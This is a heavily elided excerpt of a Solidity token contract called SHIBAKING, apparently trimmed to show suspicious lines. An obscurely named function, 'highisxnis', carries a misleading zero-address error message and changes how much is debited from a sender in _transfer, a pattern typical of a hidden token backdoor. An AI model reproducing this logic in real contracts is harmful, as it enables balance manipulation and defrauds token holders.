...
contract SHIBAKING is Context, IERC20, Ownable {
    ...
    string private constant _name = "SHIBAKING";
    string private constant _symbol = "SHIBAKING";
    ...
    function highisxnis(
        ...
        require(fee != 0, "ERC20: transfer from the zero address");
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        _balances[from] = _balances[from].sub(
            amount - highisxnis(from, amount, taxAmount)
        );
